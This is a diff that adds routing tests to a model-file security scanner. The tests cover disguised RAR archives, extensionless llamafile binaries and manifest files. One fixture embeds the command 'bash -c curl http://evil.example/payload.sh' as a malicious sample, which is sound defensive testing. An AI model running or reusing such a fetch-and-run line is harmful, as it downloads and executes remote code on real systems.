@@ -19,7 +19,7 @@ from modelaudit.scanner_registry_metadata import (
     get_extension_format_map,
     get_registered_scanner_extensions,
 )
-from modelaudit.scanners import SCANNER_REGISTRY, ScannerRegistry, _registry
+from modelaudit.scanners import SCANNER_REGISTRY, ScannerRegistry, _registry, get_scanner_for_file
 from modelaudit.scanners.archive_dispatch import _HEADER_FORMAT_TO_SCANNER_ID, _select_nested_scanner_id
 from modelaudit.scanners.base import BaseScanner, IssueSeverity
 from tests.helpers import create_mock_pytorch_zip
@@ -478,6 +478,26 @@ def test_get_scanner_for_path_routes_generic_zip_without_skops_markers_to_zip(tm
     _assert_scanner_for_path(model_path, "zip")
 
 
+def test_get_scanner_for_file_routes_disguised_rar_by_header(tmp_path: Path) -> None:
+    """Public helper routing should honor RAR magic even without a .rar suffix."""
+    path = tmp_path / "archive.payload"
+    path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)
+
+    scanner = get_scanner_for_file(str(path))
+
+    assert scanner is not None
+    assert scanner.name == "rar"
+
+
+def test_get_scanner_for_file_rejects_rar_suffix_without_magic(tmp_path: Path) -> None:
+    path = tmp_path / "not_really.rar"
+    path.write_text("plain text, not a RAR archive\n", encoding="utf-8")
+
+    scanner = get_scanner_for_file(str(path))
+
+    assert scanner is None
+
+
 def test_get_scanner_for_path_routes_valid_mar_archive_to_torchserve_mar(tmp_path: Path) -> None:
     mar_path = _write_zip_archive(
         tmp_path / "model.mar",
@@ -556,6 +576,46 @@ def test_get_scanner_for_path_routes_extensionless_readme_to_metadata_scanner(tm
     _assert_scanner_for_path(readme_path, "metadata")
 
 
+def test_get_scanner_for_path_routes_extensionless_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "llama"
+    llamafile_path.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_routes_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "llama"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"A" * (2 * 1024 * 1024 + 64)
+        + b"llamafile runtime"
+        + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "llama"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None
+
+
 @pytest.mark.parametrize("filename", ["README.md.bak", "model_card.tmp"])
 def test_get_scanner_for_path_does_not_route_metadata_near_match_suffixes(
     tmp_path: Path,
@@ -585,6 +645,16 @@ def test_get_scanner_for_path_routes_model_manifest_json_to_manifest_scanner(tmp
     manifest_path = tmp_path / "config.json"
     manifest_path.write_text(json.dumps({"model_type": "bert", "architectures": ["BertModel"]}))
 
+    _assert_scanner_for_path(manifest_path, "manifest")
+
+
+def test_get_scanner_for_path_routes_declared_manifest_paths_to_manifest_scanner(tmp_path: Path) -> None:
+    hyperparams_path = tmp_path / "hyperparams.yaml"
+    hyperparams_path.write_text("model_type: bert\n", encoding="utf-8")
+    manifest_path = tmp_path / "artifact.manifest"
+    manifest_path.write_text(json.dumps({"model_type": "bert"}), encoding="utf-8")
+
+    _assert_scanner_for_path(hyperparams_path, "manifest")
     _assert_scanner_for_path(manifest_path, "manifest")
 
 
